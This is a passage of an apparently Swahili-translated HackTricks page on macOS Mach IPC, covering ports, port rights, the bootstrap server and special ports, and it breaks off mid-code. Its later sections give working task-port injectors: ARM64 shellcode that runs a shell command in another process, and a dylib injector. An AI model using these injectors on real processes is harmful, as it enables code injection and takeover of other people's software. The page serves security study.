# macOS IPC - Mawasiliano Kati ya Mchakato

{{#include ../../../../banners/hacktricks-training.md}}

## Ujumbe wa Mach kupitia Bandari

### Taarifa za Msingi

Mach inatumia **kazi** kama **kitengo kidogo** cha kushiriki rasilimali, na kila kazi inaweza kuwa na **nyuzi nyingi**. **Kazi hizi na nyuzi zimepangwa 1:1 kwa michakato na nyuzi za POSIX**.

Mawasiliano kati ya kazi hufanyika kupitia Mawasiliano Kati ya Mchakato ya Mach (IPC), ikitumia njia za mawasiliano za upande mmoja. **Ujumbe unahamishwa kati ya bandari**, ambazo zinafanya kazi kama **foleni za ujumbe** zinazodhibitiwa na kernel.

Kila mchakato una **meza ya IPC**, ambapo inawezekana kupata **bandari za mach za mchakato**. Jina la bandari ya mach kwa kweli ni nambari (kiashiria kwa kitu cha kernel).

Mchakato pia unaweza kutuma jina la bandari pamoja na haki fulani **kwa kazi tofauti** na kernel itafanya kuonekana kwa kuingia hii katika **meza ya IPC ya kazi nyingine**.

### Haki za Bandari

Haki za bandari, ambazo zinaelezea ni shughuli zipi kazi inaweza kufanya, ni muhimu kwa mawasiliano haya. Haki zinazowezekana za **bandari** ni ([mafafanuo kutoka hapa](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Haki ya Kupokea**, ambayo inaruhusu kupokea ujumbe uliopelekwa kwa bandari. Bandari za Mach ni MPSC (mzalishaji-mwingi, mtumiaji-mmoja) foleni, ambayo ina maana kwamba kunaweza kuwa na **haki moja tu ya kupokea kwa kila bandari** katika mfumo mzima (kinyume na mabomba, ambapo michakato mingi inaweza kuwa na viashiria vya faili kwa mwisho wa kusoma wa bomba moja).
- **Kazi yenye Haki ya Kupokea** inaweza kupokea ujumbe na **kuunda Haki za Kutuma**, ikiruhusu kutuma ujumbe. Awali, tu **kazi yake mwenyewe ina Haki ya Kupokea juu ya bandari yake**.
- **Haki ya Kutuma**, ambayo inaruhusu kutuma ujumbe kwa bandari.
- Haki ya Kutuma inaweza **kuigwa** hivyo kazi inayomiliki Haki ya Kutuma inaweza kuiga haki hiyo na **kuipatia kazi ya tatu**.
- **Haki ya Kutuma-mara moja**, ambayo inaruhusu kutuma ujumbe mmoja kwa bandari na kisha inatoweka.
- **Haki ya Seti ya Bandari**, ambayo inaashiria _seti ya bandari_ badala ya bandari moja. Kuondoa ujumbe kutoka kwa seti ya bandari kunamaanisha kuondoa ujumbe kutoka kwa moja ya bandari inazozishikilia. Seti za bandari zinaweza kutumika kusikiliza kwenye bandari kadhaa kwa wakati mmoja, kama vile `select`/`poll`/`epoll`/`kqueue` katika Unix.
- **Jina la Kufa**, ambalo si haki halisi ya bandari, bali ni tu nafasi ya kuweka. Wakati bandari inaharibiwa, haki zote zilizopo za bandari kwa bandari hiyo zinageuka kuwa majina ya kufa.

**Kazi zinaweza kuhamasisha Haki za KUTUMA kwa wengine**, na kuwapa uwezo wa kutuma ujumbe nyuma. **Haki za KUTUMA pia zinaweza kuigwa, hivyo kazi inaweza kuiga na kutoa haki hiyo kwa kazi ya tatu**. Hii, pamoja na mchakato wa kati unaojulikana kama **seva ya bootstrap**, inaruhusu mawasiliano bora kati ya kazi.

### Bandari za Faili

Bandari za faili zinaruhusu kufunga viashiria vya faili katika bandari za Mac (kwa kutumia haki za bandari za Mach). Inawezekana kuunda `fileport` kutoka kwa FD iliyotolewa kwa kutumia `fileport_makeport` na kuunda FD kutoka kwa fileport kwa kutumia `fileport_makefd`.

### Kuanzisha mawasiliano

#### Hatua:

Kama ilivyotajwa, ili kuanzisha njia ya mawasiliano, **seva ya bootstrap** (**launchd** katika mac) inahusika.

1. Kazi **A** inaanzisha **bandari mpya**, ikipata **haki ya KUPOKEA** katika mchakato.
2. Kazi **A**, ikiwa ni mmiliki wa haki ya KUPOKEA, **inazalisha haki ya KUTUMA kwa bandari**.
3. Kazi **A** inaweka **kiunganishi** na **seva ya bootstrap**, ikitoa **jina la huduma ya bandari** na **haki ya KUTUMA** kupitia utaratibu unaojulikana kama usajili wa bootstrap.
4. Kazi **B** inashirikiana na **seva ya bootstrap** ili kutekeleza **kuangalia huduma** kwa jina. Ikiwa inafanikiwa, **seva inakopya haki ya KUTUMA** iliyopokelewa kutoka Kazi A na **kupeleka kwa Kazi B**.
5. Baada ya kupata haki ya KUTUMA, Kazi **B** inaweza **kuunda** ujumbe na kupeleka **kwa Kazi A**.
6. Kwa mawasiliano ya pande mbili, kawaida kazi **B** inaunda bandari mpya yenye haki ya **KUPOKEA** na haki ya **KUTUMA**, na inampa **haki ya KUTUMA kwa Kazi A** ili iweze kutuma ujumbe kwa KAZI B (mawasiliano ya pande mbili).

Seva ya bootstrap **haiwezi kuthibitisha** jina la huduma linalodaiwa na kazi. Hii ina maana kwamba **kazi** inaweza kwa urahisi **kujifanya kama kazi yoyote ya mfumo**, kama vile kudai kwa uwongo jina la huduma ya idhini na kisha kuidhinisha kila ombi.

Kisha, Apple inahifadhi **majina ya huduma zinazotolewa na mfumo** katika faili za usanidi salama, zilizoko katika **directories zilizolindwa na SIP**: `/System/Library/LaunchDaemons` na `/System/Library/LaunchAgents`. Pamoja na kila jina la huduma, **binary inayohusiana pia huhifadhiwa**. Seva ya bootstrap, itaunda na kushikilia **haki ya KUPOKEA kwa kila moja ya majina haya ya huduma**.

Kwa huduma hizi zilizowekwa awali, **mchakato wa kuangalia unabadilika kidogo**. Wakati jina la huduma linatafutwa, launchd inaanzisha huduma hiyo kwa njia ya kidinamik. Mchakato mpya ni kama ifuatavyo:

- Kazi **B** inaanzisha **kuangalia** kwa jina la huduma.
- **launchd** inakagua ikiwa kazi inafanya kazi na ikiwa haifanyi, **inaanzisha**.
- Kazi **A** (huduma) inafanya **kujiandikisha kwa bootstrap**. Hapa, seva ya **bootstrap** inaunda haki ya KUTUMA, inashikilia hiyo, na **inapeleka haki ya KUPOKEA kwa Kazi A**.
- launchd inakopya **haki ya KUTUMA na kupeleka kwa Kazi B**.
- Kazi **B** inaunda bandari mpya yenye haki ya **KUPOKEA** na haki ya **KUTUMA**, na inampa **haki ya KUTUMA kwa Kazi A** (huduma) ili iweze kutuma ujumbe kwa KAZI B (mawasiliano ya pande mbili).

Hata hivyo, mchakato huu unatumika tu kwa kazi za mfumo zilizowekwa awali. Kazi zisizo za mfumo bado zinafanya kazi kama ilivyoelezwa awali, ambayo inaweza kuruhusu kujifanya.

### Ujumbe wa Mach

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Kazi ya `mach_msg`, kimsingi ni wito wa mfumo, inatumika kwa kutuma na kupokea ujumbe wa Mach. Kazi hii inahitaji ujumbe utakaotumwa kama hoja ya awali. Ujumbe huu lazima uanze na muundo wa `mach_msg_header_t`, ukifuatwa na maudhui halisi ya ujumbe. Muundo umefafanuliwa kama ifuatavyo:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Mchakato unaomiliki _**kupokea haki**_ unaweza kupokea ujumbe kwenye bandari ya Mach. Kinyume chake, **watumaji** wanapewa _**tuma**_ au _**tuma-mara-moja haki**_. Haki ya tuma-mara-moja ni ya kutuma ujumbe mmoja tu, baada ya hapo inakuwa batili.

Ili kufikia **mawasiliano ya pande mbili** kwa urahisi, mchakato unaweza kubainisha **bandari ya mach** katika **kichwa cha ujumbe** kinachoitwa _bandari ya majibu_ (**`msgh_local_port`**) ambapo **mpokeaji** wa ujumbe anaweza **kutuma jibu** kwa ujumbe huu. Bitflags katika **`msgh_bits`** zinaweza kutumika ku **onyesha** kwamba **haki ya tuma-mara-moja** inapaswa kutolewa na kuhamishwa kwa bandari hii (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

> [!TIP]
> Kumbuka kwamba aina hii ya mawasiliano ya pande mbili inatumika katika ujumbe wa XPC ambao unatarajia replay (`xpc_connection_send_message_with_reply` na `xpc_connection_send_message_with_reply_sync`). Lakini **kwa kawaida bandari tofauti zinaundwa** kama ilivyoelezwa hapo awali ili kuunda mawasiliano ya pande mbili.

Sehemu nyingine za kichwa cha ujumbe ni:

- `msgh_size`: ukubwa wa pakiti nzima.
- `msgh_remote_port`: bandari ambayo ujumbe huu unatumwa.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: ID ya ujumbe huu, ambayo inatafsiriwa na mpokeaji.

> [!CAUTION]
> Kumbuka kwamba **ujumbe wa mach unatumwa kupitia \_bandari ya mach**\_, ambayo ni **mpokeaji mmoja**, **watumaji wengi** njia ya mawasiliano iliyojengwa ndani ya kernel ya mach. **Mchakato wengi** wanaweza **kutuma ujumbe** kwa bandari ya mach, lakini kwa wakati wowote mchakato mmoja tu unaweza **kusoma** kutoka kwake.

### Orodhesha bandari
```bash
lsmp -p <pid>
```
Unaweza kufunga chombo hiki kwenye iOS kwa kukipakua kutoka [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Mfano wa msimbo

Angalia jinsi **mjumbe** anavyo **panga** bandari, kuunda **haki ya kutuma** kwa jina `org.darlinghq.example` na kuisafirisha kwa **seva ya bootstrap** wakati mjumbe alipoomba **haki ya kutuma** ya jina hilo na kuitumia kutuma **ujumbe**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

### Bandari za Kipekee

- **Bandari ya mwenyeji**: Ikiwa mchakato una **Haki ya Kutuma** juu ya bandari hii anaweza kupata **taarifa** kuhusu **mfumo** (mfano `host_processor_info`).
- **Bandari ya haki ya mwenyeji**: Mchakato wenye **Haki ya Kutuma** juu ya bandari hii unaweza kufanya **vitendo vya kipekee** kama kupakia nyongeza ya kernel. **Mchakato unahitaji kuwa mzizi** ili kupata ruhusa hii.
- Zaidi ya hayo, ili kuita **`kext_request`** API inahitajika kuwa na haki nyingine **`com.apple.private.kext*`** ambazo zinatolewa tu kwa binaries za Apple.
- **Bandari ya jina la kazi:** Toleo lisilo na haki la _bandari ya kazi_. Inarejelea kazi, lakini haiwezeshi kudhibiti. Kitu pekee kinachonekana kupatikana kupitia hiyo ni `task_info()`.
- **Bandari ya kazi** (pia inajulikana kama bandari ya kernel)**:** Kwa ruhusa ya Kutuma juu ya bandari hii inawezekana kudhibiti kazi (kusoma/kandika kumbukumbu, kuunda nyuzi...).
- Piga `mach_task_self()` ili **kupata jina** la bandari hii kwa kazi ya mpiga simu. Bandari hii ni **inas inherit** kupitia **`exec()`**; kazi mpya iliyoundwa kwa `fork()` inapata bandari mpya ya kazi (kama kesi maalum, kazi pia inapata bandari mpya ya kazi baada ya `exec()` katika binary ya suid). Njia pekee ya kuanzisha kazi na kupata bandari yake ni kufanya ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) wakati wa kufanya `fork()`.
- Hizi ndizo vizuizi vya kufikia bandari (kutoka `macos_task_policy` kutoka binary `AppleMobileFileIntegrity`):
- Ikiwa programu ina **`com.apple.security.get-task-allow` entitlement** mchakato kutoka **mtumiaji yule yule wanaweza kufikia bandari ya kazi** (kawaida huongezwa na Xcode kwa ajili ya ufuatiliaji). Mchakato wa **notarization** hautaruhusu kwa toleo la uzalishaji.
- Programu zenye **`com.apple.system-task-ports`** entitlement zinaweza kupata **bandari ya kazi kwa mchakato wowote**, isipokuwa kernel. Katika toleo za zamani ilijulikana kama **`task_for_pid-allow`**. Hii inatolewa tu kwa programu za Apple.
- **Mzizi anaweza kufikia bandari za kazi** za programu **zisizokamilishwa** na **runtime iliyoimarishwa** (na sio kutoka Apple).

### Uingizaji wa Shellcode katika nyuzi kupitia Bandari ya Kazi

Unaweza kupata shellcode kutoka:

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Kusanya** programu ya awali na kuongeza **entitlements** ili uweze kuingiza msimbo na mtumiaji yule yule (ikiwa sivyo utahitaji kutumia **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Dylib Injection katika thread kupitia Task port

Katika macOS **threads** zinaweza kudhibitiwa kupitia **Mach** au kutumia **posix `pthread` api**. Thread tuliyoitengeneza katika sindano ya awali, ilitengenezwa kwa kutumia Mach api, hivyo **siyo ya posix compliant**.

Ilikuwa inawezekana **kuiingiza shellcode rahisi** ili kutekeleza amri kwa sababu **haikuhitaji kufanya kazi na apis za posix** zinazokubalika, bali tu na Mach. **Mingine ya kuingiza** itahitaji **thread** pia iwe **posix compliant**.

Hivyo, ili **kuboresha thread** inapaswa kuita **`pthread_create_from_mach_thread`** ambayo itaunda **pthread halali**. Kisha, hii pthread mpya inaweza **kuita dlopen** ili **kupakia dylib** kutoka mfumo, hivyo badala ya kuandika shellcode mpya ili kutekeleza vitendo tofauti, inawezekana kupakia maktaba maalum.

Unaweza kupata **esempe dylibs** katika (kwa mfano ile inayozalisha log na kisha unaweza kuisikiliza):

{{#ref}}
../../macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
